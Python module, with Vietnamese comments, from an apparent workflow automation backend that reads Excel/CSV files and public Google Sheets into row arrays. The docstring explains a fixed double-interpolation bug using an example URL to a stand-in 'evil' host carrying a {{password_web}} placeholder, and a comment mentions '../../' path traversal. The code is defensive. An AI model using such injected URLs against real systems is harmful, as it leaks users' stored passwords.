"""Khối đọc dữ liệu dạng bảng: Đọc Excel/CSV và Đọc Google Sheets.

Cả hai cùng hợp đồng output: mảng dòng (``outputVarName``) + số dòng
(``rowCountVarName``) → cắm thẳng vào khối Loop chế độ mảng.

⚠ ``step.bdata`` ĐÃ được nội suy {{var}} một lượt trước khi vào handler. KHÔNG gọi
``interpolate`` lần nữa — trước đây cả 2 khối nội suy lần 2, thành chain-replace:
tin nhắn Telegram chứa ``https://evil/?{{password_web}}`` đi vào ô Link Google
Sheet qua ``{{text}}`` sẽ bị thay tiếp thành mật khẩu thật rồi backend tự gửi đi.
"""
import io
import re
import urllib.parse
import urllib.request

import pandas as pd

from services.executor_blocks import safe_filename


def _df_to_records(df, custom_mappings):
    """DataFrame → list dict; cột "Unnamed:" bị bỏ; tên cột đổi theo columnMappings."""
    df = df.fillna("")
    df.columns = ["" if str(c).strip().startswith("Unnamed:") else str(c).strip() for c in df.columns]
    records = []
    for _, row in df.iterrows():
        item = {}
        for orig_col in df.columns:
            if not orig_col:
                continue
            item[custom_mappings.get(orig_col) or orig_col] = str(row[orig_col])
        records.append(item)
    return records


def _store_records(ctx, step, records, output_var, row_count_var):
    if not isinstance(step.current_input, dict):
        step.current_input = {}
    # Chỉ ghi theo đúng tên biến đặt trên UI — không ghi thêm key cố định "row_count"
    # (trước đây 1 giá trị 2 tên, gây khó hiểu).
    step.current_input[output_var] = records
    step.current_input[row_count_var] = len(records)
    ctx.workflow_env[output_var] = records
    ctx.workflow_env[row_count_var] = len(records)


def _google_csv_url(url, sheet_name):
    if "/spreadsheets/d/e/" in url:
        csv_url = url.replace("/pubhtml", "/pub?output=csv").replace("/edit", "/pub?output=csv")
        if "output=csv" not in csv_url:
            csv_url += ("&" if "?" in csv_url else "?") + "output=csv"
        return csv_url

    match = re.search(r"/spreadsheets/d/([a-zA-Z0-9-_]+)", url)
    if not match:
        raise Exception("Link Google Sheet không hợp lệ")
    sheet_id = match.group(1)
    if sheet_name:
        return (f"https://docs.google.com/spreadsheets/d/{sheet_id}/gviz/tq?tqx=out:csv"
                f"&sheet={urllib.parse.quote(sheet_name)}")
    gid_match = re.search(r"[#&?]gid=([0-9]+)", url)
    if gid_match:
        return f"https://docs.google.com/spreadsheets/d/{sheet_id}/export?format=csv&gid={gid_match.group(1)}"
    return f"https://docs.google.com/spreadsheets/d/{sheet_id}/export?format=csv"


def handle_google_sheets_read(ctx, step):
    bdata = step.bdata
    try:
        url = str(bdata.get("googleSheetsUrl", "")).strip()
        sheet_name = str(bdata.get("googleSheetsSheetName", "")).strip()
        header_row = int(bdata.get("googleSheetsHeaderRow") or 1)
        output_var = bdata.get("outputVarName") or "sheets_data"
        row_count_var = bdata.get("rowCountVarName") or "sheets_rows"
        custom_mappings = bdata.get("columnMappings") or {}

        if not url:
            raise Exception("Chưa cấu hình Link Google Sheet")

        req = urllib.request.Request(_google_csv_url(url, sheet_name), headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                text = resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            raise Exception(f"Không thể tải Google Sheet ({e}). Hãy kiểm tra link và đảm bảo file ở chế độ Public View.")

        df = pd.read_csv(io.StringIO(text), header=max(0, header_row - 1))
        records = _df_to_records(df, custom_mappings)
        _store_records(ctx, step, records, output_var, row_count_var)
        ctx.log(step.bid, "success", "gsheets_read_success", count=len(records),
                output_var=output_var, row_count_var=row_count_var)
    except Exception as e:
        # Trước đây `raise` trần → chỉ log "Lỗi hệ thống" và KHÔNG bao giờ chạy khối
        # Bắt Lỗi dù đã nối. Nay đi cùng đường với các khối khác.
        ctx.log(step.bid, "error", "gsheets_error", label=step.label, error=e)
        return ctx.fail(step, str(e))


def handle_excel_read(ctx, step):
    bdata = step.bdata
    try:
        # Tên file thuần: ô này đi qua nội suy {{var}}, "../../" đọc được file bất kỳ.
        file_name = safe_filename(str(bdata.get("excelReadFile", "")).strip(), "")
        sheet_name = str(bdata.get("excelReadSheetName", "")).strip()
        header_row = int(bdata.get("excelReadHeaderRow") or 1)
        output_var = bdata.get("outputVarName") or "sheets_data"
        row_count_var = bdata.get("rowCountVarName") or "sheets_rows"
        # .strip() khoảng trắng ở KEY — tên cột lúc chọn trên UI (preview chưa strip) có
        # thể lệch khoảng trắng so với tên cột thật (đã strip), VD "Mã CTKM " ≠ "Mã CTKM".
        # Lệch là mapping luôn miss, âm thầm rớt về tên cột gốc, khiến {{tên_biến}} không
        # bao giờ có giá trị. Strip ở đây để tha thứ cho mapping cũ đã lỡ lưu lệch.
        custom_mappings = {str(k).strip(): v for k, v in (bdata.get("columnMappings") or {}).items()}

        if not file_name:
            raise Exception("Chưa chọn/nhập tên file Excel")

        file_path = ctx.input_dir / file_name
        if not file_path.exists():
            file_path = ctx.output_dir / file_name
        if not file_path.exists():
            raise Exception(f"Không tìm thấy file '{file_name}' trong thư mục input/output")

        header_idx = max(0, header_row - 1)
        if str(file_path).lower().endswith(".csv"):
            df = pd.read_csv(file_path, header=header_idx)
        elif sheet_name:
            df = pd.read_excel(file_path, sheet_name=sheet_name, header=header_idx)
        else:
            df = pd.read_excel(file_path, header=header_idx)

        records = _df_to_records(df, custom_mappings)
        _store_records(ctx, step, records, output_var, row_count_var)
        ctx.log(step.bid, "success", "read_excel_success", count=len(records), file_name=file_name,
                output_var=output_var, row_count_var=row_count_var)
    except Exception as e:
        ctx.log(step.bid, "error", "read_excel_error", label=step.label, error=e)
        return ctx.fail(step, str(e))


HANDLERS = {
    "google_sheets_read": handle_google_sheets_read,
    "excel_read": handle_excel_read,
}
